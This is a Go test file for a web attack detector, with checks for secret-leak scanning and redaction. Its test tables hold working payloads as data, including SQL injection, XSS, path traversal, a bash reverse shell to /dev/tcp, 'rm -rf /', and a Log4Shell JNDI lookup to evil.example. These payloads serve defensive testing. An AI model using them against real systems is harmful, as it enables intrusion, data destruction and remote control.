package security

import (
	"net/http/httptest"
	"strings"
	"testing"
)

func TestScan(t *testing.T) {
	d := NewDetector()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		// --- SQL Injection ---
		{"SQL Classic", "SELECT * FROM users", true},
		{"SQL Union", "1 UNION SELECT 1,2,3", true},
		{"SQL Union Comment Obfuscated", "1 UNION/**/SELECT 1,2", true},
		{"SQL Comment", "admin' --", true},
		{"SQL DROP", "'; DROP TABLE students; --", true},
		{"SQL Tautology", "' OR '1'='1", true},
		{"SQL Time Based", "1 AND SLEEP(5)", true},
		{"SQL Double Encoded", "1%2520UNION%2520SELECT%25201", true},

		// --- XSS / Javascript ---
		{"JS Script Tag", "<script>alert(1)</script>", true},
		{"JS Inline Event", "<img src=x onmouseover=alert(1)>", true},
		{"JS Protocol", "javascript:alert(1)", true},
		{"JS HTML Entities", "&lt;script&gt;alert(1)&lt;/script&gt;", true},

		// --- Path Traversal ---
		{"Traversal Linux", "../../etc/passwd", true},
		{"Traversal Windows", "..\\..\\windows\\system32", true},
		{"Traversal Encoded", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", true},

		// --- NoSQL ---
		{"NoSQL Greater Than", `{"username": {"$gt": ""}}`, true},
		{"NoSQL Not Equal", `{"id": {"$ne": null}}`, true},
		{"NoSQL Query String", `user[$ne]=admin`, true},

		// --- Shell/Command Injection ---
		{"Shell Pipe", "cat file.txt | rm -rf /", true},
		{"Shell Backticks", "echo `whoami`", true},
		{"Shell Semicolon", "ls; pwd", true},
		{"Reverse Shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", true},

		// --- PHP/SSTI/Code ---
		{"PHP Open Tag", "<?php phpinfo(); ?>", true},
		{"SSTI Handlebars", "{{7*7}}", true},
		{"SSTI Template", "${res.class.loader}", true},
		{"SSTI Jinja Walk", "{{ ''.__class__.__mro__ }}", true},
		{"Log4Shell", "${jndi:ldap://evil.example/a}", true},
		{"Log4Shell Obfuscated", "${${::-j}ndi:ldap://x}", true},
		{"PHP Wrapper", "php://filter/convert.base64-encode/resource=index", true},

		// --- CRLF ---
		{"CRLF Encoded", "example.com%0d%0aSet-Cookie:session=bad", true},

		// --- Clean input (false positive checks) ---
		{"Clean String", "Hello world, this is a normal message.", false},
		{"Clean Number", "12345", false},
		{"Clean URL", "https://www.google.com/search?q=golang", false},
		{"Clean Path", "/home/user/documents/report.pdf", false},
		{"Clean Prose With SQL Words", "Please select a date from the calendar and update your profile", false},
		{"Clean Ampersand", "Tom & Jerry; the classic cartoon", false},
		{"Clean Percent", "100% cotton, 50% off", false},
		{"Clean Email", "maria.silva+news@example.com", false},
		{"Clean Wallet", "0x52908400098527886E0F7030069857D2E4169EE7", false},
		{"Clean User Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := d.Scan(LocAll, "test", tt.input)
			if (len(got) > 0) != tt.expected {
				t.Errorf("Scan(%q): expected match=%v, got %+v", tt.input, tt.expected, got)
			}
		})
	}
}

func TestScanRequest(t *testing.T) {
	d := NewDetector()

	r := httptest.NewRequest("POST", "/login?next=%2Fhome", strings.NewReader("user=admin%27+OR+%271%27%3D%271&pass=x"))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Set("User-Agent", "Mozilla/5.0")
	fs := d.ScanRequest(r, []byte("user=admin%27+OR+%271%27%3D%271&pass=x"))
	if total, _, top := Score(fs); total == 0 || top != SQLInjection {
		t.Fatalf("expected SQLi in form body, got %+v", fs)
	}

	r = httptest.NewRequest("GET", "/", nil)
	r.Header.Set("X-Api-Version", "${jndi:ldap://x/a}")
	if fs := d.ScanRequest(r, nil); len(fs) == 0 || fs[0].Field != "header:X-Api-Version" {
		t.Fatalf("expected JNDI in header, got %+v", fs)
	}

	r = httptest.NewRequest("GET", "/", nil)
	r.Header.Set("Cookie", "session=abc; id=5; theme=dark")
	r.Header.Set("Referer", "http://localhost:3000/dashboard")
	if fs := d.ScanRequest(r, nil); len(fs) != 0 {
		t.Fatalf("clean cookies/referer flagged: %+v", fs)
	}
}

func TestScoreCountsCategoryOnce(t *testing.T) {
	fs := []Finding{
		{Category: SQLInjection, Score: 9},
		{Category: SQLInjection, Score: 5},
		{Category: CrossSiteScript, Score: 8},
	}
	total, peak, top := Score(fs)
	if total != 17 || peak != 9 || top != SQLInjection {
		t.Fatalf("got total=%d peak=%d top=%s", total, peak, top)
	}
}

func TestLeaks(t *testing.T) {
	body := []byte("ok\nAWS_SECRET_ACCESS_KEY=abc\nkey AKIAABCDEFGHIJKLMNOP here\n")
	leaks := ScanLeaks(body)
	if len(leaks) < 2 {
		t.Fatalf("expected 2 leaks, got %+v", leaks)
	}
	red := string(RedactLeaks(body))
	if strings.Contains(red, "AKIAABCDEFGHIJKLMNOP") {
		t.Fatalf("not redacted: %s", red)
	}
	if ScanLeaks([]byte("<html><body>hello</body></html>")) != nil {
		t.Fatal("clean page flagged")
	}
}

func BenchmarkScan(b *testing.B) {
	d := NewDetector()
	longInput := "SELECT * FROM users WHERE id = 1 AND name = 'admin' OR '1'='1' UNION SELECT username, password FROM private_table --"
	for i := 0; i < b.N; i++ {
		d.Scan(LocAll, "bench", longInput)
	}
}

func BenchmarkScanClean(b *testing.B) {
	d := NewDetector()
	input := strings.Repeat("The quick brown fox jumps over the lazy dog. ", 40)
	for i := 0; i < b.N; i++ {
		d.Scan(LocBody, "bench", input)
	}
}
